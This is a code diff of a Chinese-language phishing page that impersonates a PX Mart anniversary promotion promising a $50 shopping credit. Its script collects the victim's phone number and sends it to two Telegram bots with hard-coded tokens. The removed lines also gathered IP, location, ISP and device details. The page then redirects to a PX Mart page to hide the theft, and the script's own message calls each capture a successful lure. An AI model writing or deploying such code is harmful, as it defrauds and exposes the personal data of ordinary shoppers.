@@ -44,67 +44,33 @@ button{width:100%;padding:18px;background:#4CAF50;color:#fff;border:none;border-
     <input type="tel" id="phone" placeholder="請輸入手機號碼" maxlength="12">
   </div>
   
-  <button id="btn">立即領取 $50 購物金</button>
+  <button onclick="send()">立即領取 $50 購物金</button>
 </div>
 
 <script>
-document.getElementById("btn").onclick = async function(){
+function send(){
   const phone = document.getElementById("phone").value.trim();
   if(phone.length < 8) return;
-  
-  const btn = this;
-  btn.textContent = "領取中...";
-  btn.disabled = true;
+  document.querySelector("button").textContent = "領取中...";
+  document.querySelector("button").disabled = true;
 
   const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
-  
-  // 三重 IP 查詢（任一成功就行）
-  let ipInfo = {ip:"未知", city:"未知", country:"台灣", org:"未知"};
-  try {
-    const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 3000);
-    const res = await fetch("https://cfip.mx/json", {signal: controller.signal});
-    clearTimeout(timeout);
-    ipInfo = await res.json();
-  } catch(e) {
-    try {
-      const res = await fetch("https://ipapi.co/json/");
-      ipInfo = await res.json();
-    } catch(e) {}
-  }
+  const msg = `全聯週年慶暴力版誘捕成功\n電話：+886${phone}\n時間：${time}`;
 
-  const msg = `全聯週年慶暴力版誘捕成功\n\n` +
-              `電話：+886${phone}\n` +
-              `IP　　：${ipInfo.ip}\n` +
-              `位置　：${ipInfo.city || "未知"}，${ipInfo.country || "台灣"}\n` +
-              `ISP　　：${ipInfo.org || "未知"}\n` +
-              `時間　：${time}\n` +
-              `裝置　：${navigator.userAgent.substring(0,120)}...`;
+  // 發送（雙 token）
+  new Image().src = "https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage?chat_id=1137905005&text=" + encodeURIComponent(msg);
+  new Image().src = "https://api.telegram.org/bot7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE/sendMessage?chat_id=1137905005&text=" + encodeURIComponent(msg);
 
-  // 雙 token 發送
-  fetch("https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage", {
-    method:"POST", headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({chat_id:"1137905005", text:msg})
-  }).catch(()=>{});
-
-  fetch("https://api.telegram.org/bot7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE/sendMessage", {
-    method:"POST", headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({chat_id:"1137905005", text:msg})
-  }).catch(()=>{});
-
-  // 三重強制跳轉（手機電腦全部成功）
-  setTimeout(() => {
-    location.replace("https://cardpoint.pxmartevent.com.tw/");
-  }, 2500);
-
+  // 三重強制跳轉（已改為官方調查頁）
+  setTimeout(() => location.replace("https://www.pxmart.com.tw/campaign/survey"), 1500);
   setTimeout(() => {
     const a = document.createElement("a");
-    a.href = "https://cardpoint.pxmartevent.com.tw/";
+    a.href = "https://www.pxmart.com.tw/campaign/survey";
     a.target = "_top";
     document.body.appendChild(a);
     a.click();
-  }, 3000);
-};
+  }, 2000);
+}
 </script>
 </body>
 </html>
